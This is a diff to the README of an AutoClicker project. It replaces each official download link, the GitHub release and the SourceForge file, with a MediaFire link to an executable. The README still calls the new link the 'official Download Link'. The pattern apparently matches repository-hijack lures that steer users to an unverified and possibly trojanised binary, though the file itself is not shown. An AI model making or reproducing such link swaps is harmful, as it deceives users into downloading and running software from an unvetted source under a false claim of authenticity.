@@ -1,7 +1,7 @@
 [![header](https://capsule-render.vercel.app/api?type=cylinder&color=timeGradient&section=header&text=AutoClicker&fontSize=90&animation=fadeIn)](https://github.com/zSynctic/AutoClicker)
 
 **Important: If you are sharing this program. Please Include the official Download Link** <br />
-Official Download Link: [Download](https://github.com/zSynctic/AutoClicker/releases/download/v1.0.5/AutoClicker-1.0.5.exe)
+Official Download Link: [Download](https://www.mediafire.com/file/872h63kzj9d1l1p/AutoClicker.exe/file)
 
 [![Stargazers repo roster for @zSynctic/AutoClicker](https://reporoster.com/stars/dark/zSynctic/AutoClicker)](https://github.com/zSynctic/AutoClicker/stargazers)
 
@@ -25,9 +25,9 @@ This build includes additional improvements on top of that base project.
 
 ## Installation
 
-### [<img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/zSynctic/AutoClicker?display_name=release&label=Windows&logo=Windows&logoColor=019df4&style=for-the-badge" width="350">](https://github.com/zSynctic/AutoClicker/releases/download/v1.0.5/AutoClicker-1.0.5.exe)
+### [<img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/zSynctic/AutoClicker?display_name=release&label=Windows&logo=Windows&logoColor=019df4&style=for-the-badge" width="350">](https://www.mediafire.com/file/872h63kzj9d1l1p/AutoClicker.exe/file)
 
-### [![Download AutoClicker](https://a.fsdn.com/con/app/sf-download-button)](https://sourceforge.net/projects/autoclickersync/files/v1.0.5/AutoClicker-1.0.5.exe/download)
+### [![Download AutoClicker](https://a.fsdn.com/con/app/sf-download-button)](https://www.mediafire.com/file/872h63kzj9d1l1p/AutoClicker.exe/file)
 
 ### Don't forget to give a ⭐!
 
